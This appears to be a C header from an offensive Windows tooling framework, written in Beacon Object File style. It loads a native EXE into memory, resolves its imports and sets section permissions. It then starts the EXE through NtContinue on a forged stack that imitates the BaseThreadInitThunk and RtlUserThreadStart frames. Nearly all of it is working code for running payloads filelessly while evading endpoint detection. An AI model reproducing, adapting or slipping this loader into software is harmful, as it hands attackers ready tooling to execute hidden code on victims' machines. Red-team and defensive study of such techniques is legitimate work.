/*
 * EXE to Shellcode Loader
 * 
 * Supports loading native Windows EXE files into memory and executing them
 * as shellcode. Handles both GUI (WinMain) and Console (mainCRTStartup/main) 
 * subsystems using proper stack spoofing via NtContinue.
 */

#ifndef EXE_LOADER_H
#define EXE_LOADER_H

#include <winsock2.h>
#include <windows.h>
#include "definitions.h"
#include "tcglib/loader.h"
#include "tcglib/loaderdefs.h"

/* ── PE Context for EXE Execution ──────────────────────────────────────── */

typedef struct {
    DLLDATA         pe_data;
    PVOID           base_address;
    SIZE_T          image_size;
    DWORD           subsystem;
    DWORD           entry_point_rva;
    LPSTR           command_line;
    LPSTR           env_block;
    HANDLE          stdin_handle;
    HANDLE          stdout_handle;
    HANDLE          stderr_handle;
    int             argc;
    char*           argv[64];
} PE_CONTEXT;

/* ── Windows API Declarations ──────────────────────────────────────────── */

WINBASEAPI HMODULE  WINAPI KERNEL32$GetModuleHandleA    (LPCSTR);
WINBASEAPI FARPROC  WINAPI KERNEL32$GetProcAddress      (HMODULE, LPCSTR);
WINBASEAPI LPVOID   WINAPI KERNEL32$VirtualAlloc        (LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL     WINAPI KERNEL32$VirtualFree         (LPVOID, SIZE_T, DWORD);
WINBASEAPI BOOL     WINAPI KERNEL32$VirtualProtect      (LPVOID, SIZE_T, DWORD, PDWORD);

NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtCreateSection    (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtMapViewOfSection (HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtClose            (HANDLE);
NTSYSCALLAPI VOID     NTAPI NTDLL$RtlCaptureContext  (PCONTEXT);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtContinue         (PCONTEXT, BOOLEAN);
NTSYSCALLAPI void*    NTAPI NTDLL$memset             (void*, int, size_t);
NTSYSCALLAPI void*    NTAPI NTDLL$memcpy             (void*, const void*, size_t);

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

/* ── Console Entry Point Types ─────────────────────────────────────────── */

/* Main CRT startup routine for console applications */
typedef int (*MAINCRT_FUNC)(void);

/* Console main entry point */
typedef int (*MAIN_FUNC)(int argc, char* argv[]);

/* GUI WinMain entry point */
typedef int WINAPI (*WINMAIN_FUNC)(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);

/* Native EXE entry point (no args) */
typedef void (*NATIVE_ENTRY_FUNC)(void);

/* ── ROR-13 Hash Helpers ───────────────────────────────────────────────── */

#define KERNEL32DLL_HASH      0x6A4ABC5B
#define GETMODULEHANDLEA_HASH 0xD3324904

/* ── Parse Command Line Arguments ──────────────────────────────────────── */

static void parse_command_line(PE_CONTEXT* ctx, const char* cmdline) {
    if (!cmdline || !cmdline[0]) {
        ctx->argc = 1;
        ctx->argv[0] = "";
        return;
    }

    char* local_cmd = (char*)KERNEL32$VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!local_cmd) {
        ctx->argc = 1;
        ctx->argv[0] = "";
        return;
    }

    int i = 0, argv_idx = 0;
    int cmdlen = 0;
    while (cmdline[cmdlen]) cmdlen++;

    NTDLL$memcpy(local_cmd, cmdline, cmdlen);
    local_cmd[cmdlen] = '\0';

    ctx->argv[argv_idx++] = local_cmd;

    int in_quotes = 0;
    for (i = 0; i < cmdlen && argv_idx < 63; i++) {
        if (local_cmd[i] == '"') {
            in_quotes = !in_quotes;
            local_cmd[i] = '\0';
        } else if (local_cmd[i] == ' ' && !in_quotes) {
            local_cmd[i] = '\0';
            if (local_cmd[i + 1] && local_cmd[i + 1] != ' ') {
                ctx->argv[argv_idx++] = &local_cmd[i + 1];
            }
        }
    }

    ctx->argv[argv_idx] = NULL;
    ctx->argc = argv_idx;
}

/* ── Execute EXE Entry Point ───────────────────────────────────────────── */

extern PVOID calculate_function_stack_size_wrapper(PVOID return_address);

static void transfer_execution_to_exe(PVOID entry_point, HINSTANCE hInstance, DWORD subsystem, PE_CONTEXT* ctx) {
    PVOID kernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    PVOID ntdll    = KERNEL32$GetModuleHandleA("ntdll.dll");

    PVOID  BaseThreadInitThunk = GetProcAddress((HMODULE)kernel32, "BaseThreadInitThunk");
    PVOID  RtlUserThreadStart  = GetProcAddress((HMODULE)ntdll,    "RtlUserThreadStart");
    PVOID  btit_ret        = (PVOID)((ULONG_PTR)BaseThreadInitThunk + 0x17);
    PVOID  ruts_ret        = (PVOID)((ULONG_PTR)RtlUserThreadStart  + 0x2c);
    SIZE_T btit_stack_size = (SIZE_T)calculate_function_stack_size_wrapper(btit_ret);
    SIZE_T ruts_stack_size = (SIZE_T)calculate_function_stack_size_wrapper(ruts_ret);

    if (!btit_stack_size || !ruts_stack_size) return;

    PVOID fake_stack = KERNEL32$VirtualAlloc(NULL, 0x40000,
                                              MEM_COMMIT | MEM_RESERVE,
                                              PAGE_READWRITE);
    if (!fake_stack) return;

    ULONG_PTR rsp = ((ULONG_PTR)fake_stack + 0x40000) & ~(ULONG_PTR)0xF;
    rsp -= 8; *(PVOID *)rsp = NULL;
    rsp -= ruts_stack_size; *(PVOID *)rsp = ruts_ret;
    rsp -= btit_stack_size; *(PVOID *)rsp = btit_ret;

    CONTEXT ctx_record;
    NTDLL$memset(&ctx_record, 0, sizeof(ctx_record));
    ctx_record.ContextFlags = CONTEXT_FULL;
    NTDLL$RtlCaptureContext(&ctx_record);

    ctx_record.Rip = (DWORD64)entry_point;
    ctx_record.Rsp = (DWORD64)rsp;

    /* Set up arguments based on subsystem */
    if (subsystem == IMAGE_SUBSYSTEM_WINDOWS_GUI) {
        /* WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) */
        ctx_record.Rcx = (DWORD64)hInstance;           /* hInstance */
        ctx_record.Rdx = 0;                            /* hPrevInstance */
        ctx_record.R8  = (DWORD64)ctx->command_line;   /* lpCmdLine */
        ctx_record.R9  = (DWORD64)SW_SHOWNORMAL;       /* nShowCmd */
    } else if (subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI) {
        /* For console app: mainCRTStartup or direct main call
           mainCRTStartup expects no args and handles argc/argv internally from environment
           For direct main call: main(int argc, char* argv[]) */
        ctx_record.Rcx = (DWORD64)ctx->argc;           /* argc */
        ctx_record.Rdx = (DWORD64)ctx->argv;           /* argv */
        ctx_record.R8  = (DWORD64)ctx->env_block;      /* envp */
    } else {
        /* Native subsystem or unknown - no standard arguments */
        ctx_record.Rcx = 0;
        ctx_record.Rdx = 0;
        ctx_record.R8  = 0;
    }

    NTDLL$NtContinue(&ctx_record, FALSE);
}

/* ── Load and Execute EXE ──────────────────────────────────────────────── */

static BOOL execute_exe_from_memory(BYTE* exe_data, SIZE_T exe_size, const char* command_line, PE_CONTEXT* ctx) {
    IMPORTFUNCS funcs = {
        .LoadLibraryA   = LoadLibraryA,
        .GetProcAddress = GetProcAddress,
        .GetModuleHandleA = GetModuleHandleA,
        .VirtualAlloc   = KERNEL32$VirtualAlloc,
        .VirtualProtect = KERNEL32$VirtualProtect,
    };

    /* Parse PE structure */
    ParseDLL((char*)exe_data, &ctx->pe_data);

    /* Validate it's actually a PE */
    if (ctx->pe_data.DosHeader->e_magic != IMAGE_DOS_SIGNATURE ||
        ctx->pe_data.NtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    /* Get subsystem and entry point */
    ctx->subsystem = ctx->pe_data.OptionalHeader->Subsystem;
    ctx->entry_point_rva = ctx->pe_data.OptionalHeader->AddressOfEntryPoint;
    ctx->image_size = ctx->pe_data.OptionalHeader->SizeOfImage;

    /* Allocate memory for the EXE image */
    PVOID exe_base = KERNEL32$VirtualAlloc(NULL, ctx->image_size,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_READWRITE);
    if (!exe_base) return FALSE;

    ctx->base_address = exe_base;
    ctx->command_line = (LPSTR)command_line ? (LPSTR)command_line : "";

    /* Load the EXE image into memory (headers + sections + relocations) */
    LoadDLL(&ctx->pe_data, (char*)exe_data, (char*)exe_base);

    /* Fix up imports - resolve all DLL function references */
    ProcessImports(&funcs, &ctx->pe_data, (char*)exe_base);

    /* Set proper section permissions */
    DWORD section_count = ctx->pe_data.NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER* section_hdr = IMAGE_FIRST_SECTION(ctx->pe_data.NtHeaders);

    for (DWORD i = 0; i < section_count; i++) {
        if (!section_hdr[i].VirtualAddress || !section_hdr[i].SizeOfRawData) continue;

        PVOID section_addr = (PVOID)((ULONG_PTR)exe_base + section_hdr[i].VirtualAddress);
        SIZE_T section_size = section_hdr[i].SizeOfRawData;
        DWORD protect = PAGE_READWRITE;

        /* Calculate appropriate protection based on section characteristics */
        if (section_hdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (section_hdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
                protect = PAGE_EXECUTE_READWRITE;
            } else if (section_hdr[i].Characteristics & IMAGE_SCN_MEM_READ) {
                protect = PAGE_EXECUTE_READ;
            } else {
                protect = PAGE_EXECUTE;
            }
        } else if (section_hdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            protect = PAGE_READWRITE;
        } else if (section_hdr[i].Characteristics & IMAGE_SCN_MEM_READ) {
            protect = PAGE_READONLY;
        }

        DWORD old_protect;
        KERNEL32$VirtualProtect(section_addr, section_size, protect, &old_protect);
    }

    /* Protect headers as read-only */
    DWORD old_protect;
    KERNEL32$VirtualProtect(exe_base, ctx->pe_data.OptionalHeader->SizeOfHeaders,
                            PAGE_READONLY, &old_protect);

    /* Get entry point address and transfer execution */
    PVOID entry = (PVOID)((ULONG_PTR)exe_base + ctx->entry_point_rva);

    /* Parse command line into argc/argv */
    parse_command_line(ctx, command_line);

    /* Transfer execution to the EXE entry point with spoofed stack */
    transfer_execution_to_exe(entry, (HINSTANCE)exe_base, ctx->subsystem, ctx);

    return TRUE;
}

#endif /* EXE_LOADER_H */
